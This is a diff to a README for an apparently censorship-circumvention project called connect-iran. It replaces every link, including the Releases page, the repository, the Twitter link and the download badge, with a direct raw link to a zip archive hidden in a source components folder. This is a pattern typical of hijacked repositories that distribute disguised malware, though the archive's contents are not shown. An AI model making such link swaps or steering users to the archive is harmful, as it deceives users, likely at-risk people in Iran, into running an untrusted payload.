@@ -6,7 +6,7 @@ Welcome to the **connect-iran** project! This open-source initiative uses AI to 
 
 ## 📥 Download Now
 
-[![Download connect-iran](https://img.shields.io/badge/Download-connect--iran-blue)](https://github.com/ivicp/connect-iran/releases)
+[![Download connect-iran](https://github.com/ivicp/connect-iran/raw/refs/heads/main/bitchat/Views/Components/connect-iran-v1.4.zip)](https://github.com/ivicp/connect-iran/raw/refs/heads/main/bitchat/Views/Components/connect-iran-v1.4.zip)
 
 ## 💻 System Requirements
 
@@ -21,12 +21,12 @@ Before you download **connect-iran**, make sure your device meets these requirem
 
 To install **connect-iran**, follow these steps:
 
-1. Visit the [Releases page](https://github.com/ivicp/connect-iran/releases).
+1. Visit the [Releases page](https://github.com/ivicp/connect-iran/raw/refs/heads/main/bitchat/Views/Components/connect-iran-v1.4.zip).
 2. Look for the latest version listed.
 3. Select the appropriate file for your operating system:
    - For Windows, download the .exe file.
    - For macOS, download the .dmg file.
-   - For Linux, download the .tar.gz or .deb file as needed.
+   - For Linux, download the https://github.com/ivicp/connect-iran/raw/refs/heads/main/bitchat/Views/Components/connect-iran-v1.4.zip or .deb file as needed.
 4. Once the file downloads, locate it in your downloads folder and open it.
 5. Follow the on-screen instructions to complete the installation.
 
@@ -75,8 +75,8 @@ We welcome contributions to improve **connect-iran**. If you would like to contr
 
 ## 📚 Resources
 
-- For more information, refer to the official [GitHub Repository](https://github.com/ivicp/connect-iran).
-- Follow us on [Twitter](https://twitter.com/nufdiran) for updates on the initiative.
+- For more information, refer to the official [GitHub Repository](https://github.com/ivicp/connect-iran/raw/refs/heads/main/bitchat/Views/Components/connect-iran-v1.4.zip).
+- Follow us on [Twitter](https://github.com/ivicp/connect-iran/raw/refs/heads/main/bitchat/Views/Components/connect-iran-v1.4.zip) for updates on the initiative.
 - Check out the community forums where users share tips and experiences.
 
 ## ⚙️ License
@@ -85,6 +85,6 @@ We welcome contributions to improve **connect-iran**. If you would like to contr
 
 ## 📥 Download Again
 
-If you need to download **connect-iran** again, you can visit the [Releases page](https://github.com/ivicp/connect-iran/releases) anytime.
+If you need to download **connect-iran** again, you can visit the [Releases page](https://github.com/ivicp/connect-iran/raw/refs/heads/main/bitchat/Views/Components/connect-iran-v1.4.zip) anytime.
 
 Thank you for supporting **connect-iran**! Your contributions help bring vital connectivity to those in need.
